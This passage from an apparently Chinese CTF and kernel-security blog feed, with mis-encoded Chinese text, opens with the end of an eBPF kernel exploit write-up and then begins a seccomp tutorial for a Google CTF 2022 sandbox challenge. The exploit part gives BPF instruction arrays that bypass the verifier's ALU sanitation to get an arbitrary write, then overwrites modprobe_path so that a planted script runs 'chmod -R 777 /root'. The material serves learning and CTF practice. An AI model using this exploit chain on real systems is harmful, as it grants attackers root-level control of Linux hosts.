key</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),    </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>), <span class="comment">// value</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),              <span class="comment">// flags</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">    Â·Â·Â·</span><br><span class="line">    <span class="comment">// FP-0x18 è®¾ç½®ä¸ºä¸€ä¸ªæŒ‡é’ˆå€¼ (*) &amp;map[0]</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (*) ç»•è¿‡ ALU sanitation</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),              <span class="comment">// arg2=offset  (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     <span class="comment">// arg3=to      (FP-0x20)</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x20</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      <span class="comment">// arg4=len     (0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reg0 = *(u64 *)(FP-0x18)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»»æ„åœ°å€å†™</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_1, value &gt;&gt; <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, value &amp; <span class="number">0xffffffff</span>),</span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, <span class="number">0</span>), <span class="comment">// å½ãƒã‚¤ãƒ³ã‚¿ã¸ã®æ›¸ãè¾¼ã¿</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="æ‰§è¡Œä»»æ„æŒ‡ä»¤"><a href="#æ‰§è¡Œä»»æ„æŒ‡ä»¤" class="headerlink" title="æ‰§è¡Œä»»æ„æŒ‡ä»¤"></a>æ‰§è¡Œä»»æ„æŒ‡ä»¤</h2><p>æœ€ç»ˆæ³„éœ²äº† kernel_base ä»¥åï¼Œå°±å¯ä»¥é€šè¿‡ä»»æ„åœ°å€å†™ï¼Œå°† â€œ&#x2F;tmp&#x2F;xâ€ å†™å…¥ modprobe_pathã€‚è¯»å–flagã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;echo -e &#x27;#!/bin/sh\nchmod -R 777 /root&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -e &#x27;\xde\xad\xbe\xef&#x27; &gt; /tmp/pwn&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/pwn&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/tmp/pwn&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/ebpf-12-10/1-11.png"></p>
<p><img src="/img/ebpf-12-10/res.png"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ebpf é€šè¿‡å¯„å­˜å™¨è¯»&#x2F;å†™æŒ‡å®šåœ°å€å¾ˆæ–¹ä¾¿ï¼Œå°¤å…¶æ˜¯é€šè¿‡æ ˆæŒ‡é’ˆï¼Œåƒæ˜¯åœ¨å†™æ›´ç®€æ´çš„ shellcodeã€‚æœ‰ä¸€äº›ç»•è¿‡å’Œ fake çš„æ€è·¯å’Œ v8 å¾ˆåƒï¼Œå¯èƒ½è¿™å°±æ˜¯ JIT çš„ç›¸é€šæ€§å§ã€‚</p>
<p>ç¯å¢ƒå’Œå®Œæ•´çš„ exp éƒ½å¯ä»¥åœ¨ä¸‹é¢å‚è€ƒæ–‡ç« ä¸­æ‰¾åˆ°ã€‚</p>
<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><ol>
<li><a href="https://pawnyable.cafe/linux-kernel/LK06/exploit.html">eBPFã®ãƒã‚°ã®æ‚ªç”¨ | PAWNYABLE!</a></li>
<li><a href="https://pawnyable.cafe/linux-kernel/LK06/verifier.html">æ¤œè¨¼å™¨ã¨JITã‚³ãƒ³ãƒ‘ã‚¤ãƒ© | PAWNYABLE!</a></li>
</ol>
]]></content>
      <categories>
        <category>çŸ¥è¯†å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ebpf</tag>
      </tags>
  </entry>
  <entry>
    <title>seccompå’Œgooglectf2022-S2</title>
    <url>/2023/01/04/seccomp%E5%92%8C%E6%9C%80%E8%BF%91%E9%81%87%E5%88%B0%E7%9A%84sandbox/</url>
    <content><![CDATA[<p>seccomp çš„ç›¸å…³å­¦ä¹ å’Œ googlectf2022çš„ä¸€é“æ²™ç®±é¢˜ç›®-S2ã€‚</p>
<p><img src="/img/seccomp_ctf/chall.png"></p>
<span id="more"></span>

<h1 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">syscall</span><span class="params">(SYS_seccomp, <span class="type">unsigned</span> <span class="type">int</span> operation, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">void</span> *args)</span>;</span><br></pre></td></tr></table></figure>

<p>operations æœ‰å¦‚ä¸‹å‡ ç§ï¼šSECCOMP_SET_MODE_STRICTï¼Œ SECCOMP_SET_MODE_FILTERï¼ŒSECCOMP_GET_ACTION_AVAIL (since Linux 4.14)ï¼ŒSECCOMP_GET_NOTIF_SIZES (since Linux 5.0)ã€‚</p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Desc</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>SECCOMP_SET_MODE_STRICT</td>
<td>only allow read, write, exitï¼Œ sigreturn</td>
<td>0x0</td>
</tr>
<tr>
<td>SECCOMP_SET_MODE_FILTER</td>
<td>apply provided BPF in args</td>
<td>0x1</td>
</tr>
<tr>
<td>SECCOMP_GET_ACTION_AVAIL</td>
<td>Test to see if an action is supported by the kernel.</td>
<td>0x2</td>
</tr>
<tr>
<td>SECCOMP_GET_NOTIF_SIZES</td>
<td>Get the sizes of the seccomp user-space notification structures.</td>
<td>0x3</td>
</tr>
</tbody></table>
<h2 id="SECCOMP-SET-MODE-STRICT"><a href="#SECCOMP-SET-MODE-STRICT" class="headerlink" title="SECCOMP_SET_MODE_STRICT"></a>SECCOMP_SET_MODE_STRICT</h2><p>ä½¿ç”¨æ—¶ args å¿…é¡»ä¸º NULLã€‚è¯¥ operation å’Œä¸‹é¢çš„è°ƒç”¨ç›¸åŒï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);</span><br></pre></td></tr></table></figure>

<h2 id="SECCOMP-SET-MODE-FILTER"><a href="#SECCOMP-SET-MODE-FILTER" class="headerlink" title="SECCOMP_SET_MODE_FILTER"></a>SECCOMP_SET_MODE_FILTER</h2><p>å¾ˆå¸¸ç”¨çš„ä¸€ä¸ª operationï¼Œå®ƒå…è®¸æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæŒ‡å‘ BPF çš„æŒ‡é’ˆï¼Œé€šè¿‡ args å‚æ•°è¿›è¡Œä¼ é€’ã€‚è¿™ä¸ªæŒ‡é’ˆæ˜¯ä¸€ä¸ªæŒ‡å‘<code>struct sock_fprog</code>ç»“æ„ä½“çš„æŒ‡é’ˆï¼›å®ƒå¯ä»¥æŒ‡å®šè¿‡æ»¤ä»»æ„çš„ç³»ç»Ÿè°ƒç”¨å’Œç³»ç»Ÿè°ƒç”¨å‚æ•°ã€‚å¦‚æœ<code>fork</code>å’Œ<code>clone</code>å…è®¸è¢«è°ƒç”¨ï¼Œå­è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨é™åˆ¶å’Œå…¶çˆ¶è¿›ç¨‹ç›¸åŒã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog);</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†ä½¿ç”¨ SECCOMP_SET_MODE_FILTERï¼Œè°ƒç”¨çº¿ç¨‹å¿…é¡»åœ¨å…¶ user namespace ä¸­æœ‰ CAP_SYS_ADMINã€‚<strong>æˆ–è€…</strong>è¯¥çº¿ç¨‹å¿…é¡»å·²ç»è®¾ç½®äº† no_new_privs æ¯”ç‰¹ä½ã€‚å¦‚æœè¯¥æ¯”ç‰¹ä½æ²¡æœ‰è¢«å…¶ç¥–å…ˆè®¾ç½®ï¼Œä½¿ç”¨å¦‚ä¸‹è°ƒç”¨è®¾ç½®ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>);</span><br><span class="line">syscall(__NR_prctl,PR_SET_NO_NEW_PRIVS, <span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>å½“ flags ä¸º 0 æ—¶ï¼Œè¯¥ operation å’Œå¦‚ä¸‹è°ƒç”¨ç›¸åŒï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, args);</span><br></pre></td></tr></table></figure>

<p>è¯¥ operations å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ flagsï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SECCOMP_FILTER_FLAG_LOG (since Linux 4.14)</span><br><span class="line">SECCOMP_FILTER_FLAG_NEW_LISTENER (since Linux 5.0)</span><br><span class="line">SECCOMP_FILTER_FLAG_SPEC_ALLOW (since Linux 4.17)</span><br><span class="line">SECCOMP_FILTER_FLAG_TSYNC</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ SECCOMP_FILTER_FLAG_NEW_LISTENERï¼Œå½“æˆåŠŸåº”ç”¨ä¸€ä¸ª filter åï¼Œä¼šè¿”å›ä¸€ä¸ªæ–°çš„ç”¨æˆ·ç©ºé—´çš„notification file descriptorã€‚ï¼ˆè¯¥æ–‡ä»¶æè¿°ç¬¦è®¾ç½®äº† close-on-exec æ ‡å¿—ä½ï¼‰ã€‚å½“ä¸€ä¸ª filter è¿”å› SECCOMP_RET_USER_NOTIFï¼Œå°±ä¼šç»™è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦å‘é€ä¸€ä¸ªé€šçŸ¥ã€‚ä¸€ä¸ªçº¿ç¨‹æœ€å¤šå¯ä»¥åº”ç”¨ä¸€ä¸ªä½¿ç”¨SECCOMP_FILTER_FLAG_NEW_LISTENER æ ‡å¿—çš„ seccomp filterã€‚</p>
<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>å½“é€šè¿‡ SECCOMP_SET_MODE_FILTER æ·»åŠ ä¸€ä¸ªè¿‡æ»¤å™¨æ—¶ï¼Œargs æŒ‡å‘ä¸€ä¸ªè¿‡æ»¤å™¨ç¨‹åºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span></span><br><span class="line">               <span class="type">unsigned</span> <span class="type">short</span>      len;    <span class="comment">/* Number of BPF instructions */</span></span><br><span class="line">               <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span> <span class="comment">/* Pointer to array of</span></span><br><span class="line"><span class="comment">                                              BPF instructions */</span></span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>

<p>è¯¥ç¨‹åºå¿…é¡»åŒ…å« BPF æŒ‡ä»¤ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>            <span class="comment">/* Filter block */</span></span><br><span class="line">               __u16 code;                 <span class="comment">/* Actual filter code */</span></span><br><span class="line">               __u8  jt;                   <span class="comment">/* Jump true */</span></span><br><span class="line">               __u8  jf;                   <span class="comment">/* Jump false */</span></span><br><span class="line">               __u32 k;                    <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>

<p>å½“æ‰§è¡ŒæŒ‡ä»¤æ—¶ï¼ŒBPF ç¨‹åºå°†å¯ç”¨çš„ç³»ç»Ÿè°ƒç”¨ä¿¡æ¯ä½¿ç”¨ä»¥ä¸‹å½¢å¼çš„ç¼“å†²åŒºè¿›è¡Œæ“ä½œï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">               <span class="type">int</span>   nr;                   <span class="comment">/* System call number */</span></span><br><span class="line">               __u32 arch;                 <span class="comment">/* AUDIT_ARCH_* value</span></span><br><span class="line"><span class="comment">                                              (see &lt;linux/audit.h&gt;) */</span></span><br><span class="line">               __u64 instruction_pointer;  <span class="comment">/* CPU instruction pointer */</span></span><br><span class="line">               __u64 args[<span class="number">6</span>];              <span class="comment">/* Up to 6 system call arguments */</span></span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>

<p>æŒ‰ç…§ä¼˜å…ˆçº§é€’å‡çš„é¡ºåºï¼Œseccomp fileter å¯èƒ½è¿”å›å¦‚ä¸‹ action valueï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SECCOMP_RET_KILL_PROCESS </span><br><span class="line">SECCOMP_RET_KILL_THREAD</span><br><span class="line">SECCOMP_RET_TRAP</span><br><span class="line">SECCOMP_RET_ERRNO</span><br><span class="line">SECCOMP_RET_USER_NOTIF</span><br><span class="line">SECCOMP_RET_TRACE</span><br><span class="line">SECCOMP_RET_LOG</span><br><span class="line">SECCOMP_RET_ALLOW</span><br></pre></td></tr></table></figure>

<h3 id="SECCOMP-RET-USER-NOTIF"><a href="#SECCOMP-RET-USER-NOTIF" class="headerlink" title="SECCOMP_RET_USER_NOTIF"></a>SECCOMP_RET_USER_NOTIF</h3><p>è½¬å‘ç³»ç»Ÿè°ƒç”¨ç»™ user-space çš„ç›‘æ§è¿›ç¨‹å¹¶è®©å…¶è®©å…¶æ¥å†³å®šå¦‚ä½•å¤„ç†è¯¥ç³»ç»Ÿè°ƒç”¨ã€‚<strong>é€šå¸¸å½“å…è®¸æˆ‘ä»¬ä½¿ç”¨ seccomp å’Œ ioctl ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª seccomp supervisor process æ¥ä½¿å¾—æŸäº› syscall ä¸ä¼šè¢« monitor trace åˆ°ã€‚è¿™ä¹Ÿæ˜¯è§£å†³ä¸€äº›é¢˜ç›®çš„å…³é”®</strong>ã€‚å¦‚æœæ²¡æœ‰ç›‘æ§è¿›ç¨‹åˆ™ filter è¿”å› ENOSYSã€‚å¦‚æœæœ‰ä¼˜å…ˆçº§æ›´é«˜çš„ action value è¿”å›ï¼Œåˆ™ç›‘æ§è¿›ç¨‹ä¸ä¼šè¢«é€šçŸ¥ã€‚</p>
<h3 id="SECCOMP-RET-TRACE"><a href="#SECCOMP-RET-TRACE" class="headerlink" title="SECCOMP_RET_TRACE"></a>SECCOMP_RET_TRACE</h3><p>å…¶ä¸­å½“è¿”å› SECCOMP_RET_TRACE æ—¶ï¼Œè¯¥å€¼ä¼šä½¿å†…æ ¸å°è¯•é€šçŸ¥ ptraceã€‚å¦‚æœæ²¡æœ‰ tracer å­˜åœ¨ï¼Œç³»ç»Ÿè°ƒç”¨å°±ä¸ä¼šæ‰§è¡Œå¹¶è¿”å›å¤±è´¥çŠ¶æ€ã€‚ä½¿ç”¨ptrace(PTRACE_SETOPTIONS)ç”³è¯· PTRACE_O_TRACESECCOMP çš„ tracer ä¼šè¢«é€šçŸ¥PTRACE_EVENT_SECCOMPï¼Œfilter è¿”å›å€¼çš„ SECCOMP_RET_DATA éƒ¨åˆ†å°†é€šè¿‡ PTRACE_GETEVENTMSG æä¾›ç»™ tracerã€‚tracer å¯ä»¥é€šè¿‡å°†ç³»ç»Ÿè°ƒç”¨å·æ›´æ”¹ä¸º -1 æ¥è·³è¿‡ç³»ç»Ÿè°ƒç”¨ã€‚æˆ–è€…ï¼Œtracer å¯ä»¥é€šè¿‡å°†ç³»ç»Ÿè°ƒç”¨å·æ”¹ä¸ºæœ‰æ•ˆçš„ç³»ç»Ÿè°ƒç”¨å·æ¥æ›´æ”¹æ‰€è¯·æ±‚çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¦‚æœè·Ÿè¸ªç¨‹åºè¯·æ±‚è·³è¿‡ç³»ç»Ÿè°ƒç”¨ï¼Œåˆ™ç³»ç»Ÿè°ƒç”¨å°†æ˜¾ç¤ºä¸º tracer æ”¾å…¥è¿”å›å€¼å¯„å­˜å™¨ä¸­çš„å€¼ã€‚å½“æœ‰ä¼˜å…ˆçº§é«˜äº SECCOMP_RET_TRACE çš„ action value è¿”å›æ—¶ï¼Œtracer å°†ä¸ä¼šè¢«é€šçŸ¥ã€‚</p>
<h2 id="Seccomp-specific-BPF-details"><a href="#Seccomp-specific-BPF-details" class="headerlink" title="Seccomp-specific BPF details"></a>Seccomp-specific BPF details</h2><ul>
<li>æ‰€æœ‰çš„ operations å¿…é¡» load å’Œ store 4 å­—èŠ‚çš„æ•°æ®ï¼šBPF_W</li>
<li>ä½¿ç”¨ BPF_ABS å¯»å€æ¨¡å¼ä¿®é¥°ç¬¦æ¥è®¿é—® seccomp_data ç¼“å†²åŒºä¸­çš„å†…å®¹</li>
<li>BPF_LENå¯»å€æ¨¡å¼ä¿®é¥°ç¬¦äº§ç”Ÿä¸€ä¸ªç«‹å³æ¨¡å¼æ“ä½œæ•°ï¼Œå…¶å€¼æ˜¯ seccomp_data ç¼“å†²åŒºçš„å¤§å°ã€‚</li>
</ul>
<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc ./seccomp.c -o seccomp_test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> X32_SYSCALL_BIT 0x40000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">install_filter</span><span class="params">(<span class="type">int</span> syscall_nr, <span class="type">int</span> t_arch, <span class="type">int</span> f_errno)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> upper_nr_limit = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assume that AUDIT_ARCH_X86_64 means the normal x86-64 ABI</span></span><br><span class="line"><span class="comment">              (in the x32 ABI, all system calls have bit 30 set in the</span></span><br><span class="line"><span class="comment">              &#x27;nr&#x27; field, meaning the numbers are &gt;= X32_SYSCALL_BIT). */</span></span><br><span class="line">    <span class="keyword">if</span> (t_arch == AUDIT_ARCH_X86_64)</span><br><span class="line">        upper_nr_limit = X32_SYSCALL_BIT - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">/* [0] ä» &#x27;seccomp_data&#x27; ä¸­åŠ è½½æ¶æ„ä¿¡æ¯åˆ°ç´¯åŠ å™¨ä¸­. */</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                 (offsetof(<span class="keyword">struct</span> seccomp_data, arch))),</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [1] Jump forward 5 instructions if architecture does not</span></span><br><span class="line"><span class="comment">                      match &#x27;t_arch&#x27;. */</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, t_arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [2] Load system call number from &#x27;seccomp_data&#x27; buffer into</span></span><br><span class="line"><span class="comment">                      accumulator. */</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                 (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [3] Check ABI - only needed for x86-64 in deny-list use</span></span><br><span class="line"><span class="comment">                      cases.  Use BPF_JGT instead of checking against the bit</span></span><br><span class="line"><span class="comment">                      mask to avoid having to reload the syscall number. */</span></span><br><span class="line">        <span class="comment">// BPF_JUMP(BPF_JMP | BPF_JGT | BPF_K, upper_nr_limit, 3, 0),</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [4] Jump forward 1 instruction if system call number</span></span><br><span class="line"><span class="comment">                      does not match &#x27;syscall_nr&#x27;. */</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, syscall_nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* [6] Destination of system call number mismatch: allow other</span></span><br><span class="line"><span class="comment">                      system calls. */</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [5] Matching architecture and system call: don&#x27;t execute</span></span><br><span class="line"><span class="comment">                  the system call, and return &#x27;f_errno&#x27; in &#x27;errno&#x27;. */</span></span><br><span class="line">        <span class="comment">// BPF_STMT(BPF_RET | BPF_K,</span></span><br><span class="line">        <span class="comment">//          SECCOMP_RET_ERRNO | (f_errno &amp; SECCOMP_RET_DATA)),</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [7] Destination of architecture mismatch: kill process. */</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = ARRAY_SIZE(filter),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;seccomp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (install_filter(__NR_write, AUDIT_ARCH_X86_64, <span class="number">1</span>))</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line"></span><br><span class="line">    syscall(__NR_write, <span class="number">1</span>, <span class="string">&quot;write is avaliable\n&quot;</span>, <span class="number">19</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/seccomp_ctf/1-1.png"></p>
<p>æˆåŠŸè¾“å‡ºã€‚ï¼ˆæœ€åä¸€è¡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰</p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ prctl çš„ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ª seccomp æ²™ç®±ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00000002</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00000001</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x80000000</span>&#125;,</span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    syscall(__NR_prctl,PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Apply the filter.</span></span><br><span class="line">	